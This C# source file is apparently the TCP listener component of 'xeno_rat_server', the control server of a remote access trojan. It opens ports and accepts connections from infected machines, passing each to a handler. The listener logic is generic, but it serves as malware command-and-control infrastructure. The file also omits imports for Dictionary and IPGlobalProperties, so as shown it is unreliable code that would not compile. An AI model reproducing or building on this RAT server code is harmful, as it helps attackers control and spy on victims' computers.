using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Linq;

namespace xeno_rat_server
{
    class Listener
    {
        private readonly Dictionary<int, _listener> listeners = new Dictionary<int, _listener>();
        private readonly Func<Socket, Task> ConnectCallBack;

        public Listener(Func<Socket, Task> connectCallBack)
        {
            ConnectCallBack = connectCallBack ?? throw new ArgumentNullException(nameof(connectCallBack));
        }

        public bool PortInUse(int port)
        {
            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            return ipProperties.GetActiveTcpListeners().Any(endPoint => endPoint.Port == port);
        }

        public void CreateListener(int port)
        {
            if (PortInUse(port))
            {
                MessageBox.Show("That port is currently in use!");
                return;
            }

            if (!listeners.ContainsKey(port))
            {
                listeners[port] = new _listener(port);
            }

            try
            {
                listeners[port].StartListening(ConnectCallBack);
            }
            catch
            {
                listeners[port].StopListening();
                MessageBox.Show("There was an error using this port!");
            }
        }

        public void StopListener(int port)
        {
            if (listeners.TryGetValue(port, out var listener))
            {
                listener.StopListening();
            }
        }
    }

    class _listener
    {
        private Socket listener;
        private readonly int port;
        private bool listening = false;

        public _listener(int _port)
        {
            port = _port;
        }

        public async Task StartListening(Func<Socket, Task> connectCallBack)
        {
            IPAddress ipAddress = IPAddress.Any;
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);
            listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            listener.Bind(localEndPoint);
            listener.Listen(100);
            listening = true;

            while (listening)
            {
                try
                {
                    Socket handler = await listener.AcceptAsync();
                    await connectCallBack(handler);
                }
                catch (ObjectDisposedException)
                {
                    break;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }

        public void StopListening()
        {
            listening = false;
            try { listener?.Shutdown(SocketShutdown.Both); } catch { }
            try { listener?.Close(); } catch { }
            try { listener?.Dispose(); } catch { }
        }
    }
}
